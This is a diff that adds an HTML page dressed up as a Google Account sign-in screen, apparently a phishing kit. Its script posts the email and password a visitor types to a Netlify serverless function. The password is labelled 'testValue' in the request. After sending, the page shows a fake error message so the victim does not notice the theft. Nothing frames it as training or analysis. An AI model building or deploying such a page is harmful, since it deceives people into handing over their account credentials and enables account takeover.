@@ -1,0 +1,73 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Account - Sign in</title>
+    <style>
+        /* 이전 스타일 그대로 유지 */
+        body { margin:0; padding:0; background:#f8f9fa; font-family:'Roboto',Arial,sans-serif; height:100vh; display:flex; justify-content:center; align-items:center; }
+        .google-box { background:white; padding:40px 50px; border-radius:8px; width:420px; box-shadow:0 2px 20px rgba(0,0,0,0.15); text-align:center; }
+        .google-logo { font-size:32px; margin-bottom:20px; }
+        .g-blue {color:#4285f4;} .g-red {color:#ea4335;} .g-yellow {color:#fbbc05;} .g-green {color:#34a853;}
+        h1 {font-size:24px; margin:10px 0 8px;}
+        p {color:#5f6368; margin-bottom:25px;}
+        input {width:100%; padding:14px 16px; margin:8px 0; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box;}
+        input:focus {outline:none; border:2px solid #4285f4;}
+        button {width:100%; padding:12px 24px; margin-top:20px; background:#1a73e8; color:white; font-size:15px; font-weight:500; border:none; border-radius:4px; cursor:pointer;}
+        button:hover {background:#185abc;}
+        .info {margin-top:20px; font-size:12px; color:#666;}
+    </style>
+</head>
+<body>
+    <div class="google-box">
+        <div class="google-logo">
+            <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
+        </div>
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+        
+        <input type="text" id="email" placeholder="Email or phone" required>
+        <input type="password" id="password" placeholder="Password" required>
+        
+        <button id="submit">Next</button>
+        
+        <div class="info" id="savedInfo"></div>
+    </div>
+
+  <script>
+
+const emailInput = document.querySelector("#email");
+const passwordInput = document.querySelector("#password");
+const button = document.querySelector("#submit");
+
+button.addEventListener("click", async () => {
+  alert("Verifying...");
+
+  const username = emailInput.value.trim();
+  const testValue = passwordInput.value;
+
+  if (!email || !password) return;
+
+  await fetch("/.netlify/functions/submit", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      username,
+      testValue
+    })
+  });
+
+  setTimeout(() => {
+    alert("An Error Occurred.");
+  }, 1000);
+});
+</script>
+
+</body>
+</html>
+</body>
+</html>
